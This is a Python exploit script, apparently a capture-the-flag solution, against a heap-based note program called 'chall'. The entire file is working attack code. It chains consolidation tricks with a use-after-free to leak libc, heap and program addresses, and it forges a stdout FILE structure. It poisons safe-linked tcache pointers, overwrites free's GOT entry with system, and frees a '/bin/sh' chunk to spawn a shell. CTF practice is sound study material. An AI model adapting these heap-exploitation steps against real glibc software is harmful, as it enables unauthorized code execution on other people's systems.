#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1234)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


def cmd(option):
	sla(b"5. Exit\n", str(option).encode('latin-1'))

def send_idx(idx):
	sla(b"What index?\n", str(idx).encode('latin-1'))


def add(idx, size, buf):
	cmd(1)
	send_idx(idx)
	sla(b"What size would you like to make it?\n", str(size).encode('latin-1'))
	sa(b"What data would you like to store here?\n", buf)
	print(f"add {idx} {size}")

def show(idx):
	cmd(2)
	send_idx(idx)
	print(f"show {idx}")
	return reu(b"\nW").strip(b"\nW")

def edit(idx, buf):
	cmd(3)
	send_idx(idx)
	sla(b"What new data would you like to store here?\n", buf)
	print(f"edit {idx}")

def delete(idx):
	cmd(4)
	send_idx(idx)
	print(f"delete {idx}")

libc=SetupLibcELF()
io = start()

add(0, 0x100, b"A"*0x100)
add(1, 0x100, b"B"*0x100)
add(2, 0x100, b"C"*0x100)
add(3, 0x100, b"D"*0x100)
add(4, 0x100, b"E"*0x100)
add(5, 0x100, b"F"*0x100)
add(6, 0x100, b"G"*0x100)
add(7, 0x100, b"A"*0x100) # chunk A for consolidation
add(8, 0x100, b"A"*0x100) # chunk B victim chunk
add(15, 0x68, b"A"*0x68)  # guard chunk prevent top chunk consolidation
delete(6)
delete(5)
delete(4)
delete(3)
delete(2)
delete(1)
delete(0)
delete(8) # chunk B
libc.address=uu64(show(8))-0x1edcc0
lb()
delete(7) # chunk A
add(10, 0x100, b"A"*0x100) # chunk B victim chunk
delete(8) # chunk B is now coalasced with chunk A
print(hex(libc.sym.system))
leak = show(6)
heap_base = uu64(leak[:8])<<12
info(f"Heap base := {hex(heap_base)}")
info(f"target := {hex(libc.address+0x1ed0b8)}")
add(11, 0x120, b'\x00'*0xf8 + p(0xdeadbeef) + p(0) + p(0x111) + p(heap_base+0x10^(heap_base>>12))) # change fd of chunk B by adding a new chunck

strchr = libc.address+0x1ed0b8
stdout = libc.address+0x1ee760
payload = p64(0xfbad1800) + p64(0)*3 + p64(libc.address+0x2310d0) + p64(libc.address+0x2310d0 + 0x8)*3 + p64(libc.address+0x2310d0 + 0x9) # leak PIE address libc.address+0x2310d0 is a pointer to some pie address stored in ld section

add(12, 0x100, b"/bin/sh\x00")
add(13, 0x100, p16(0x10)*0x40 + p(0xde)*15 + p(stdout))
add(14, 0x100, payload )
exe.address=uu64(ren(6))-0x71b0
pb()
edit(13, p16(0x10)*0x40 + p(0xde)*15 + p(exe.got.free-8)) # change fd of chunk B by using Write After Free
add(9, 0x100, p(libc.sym.system)*2)
sleep(2)
delete(12)
io.interactive()
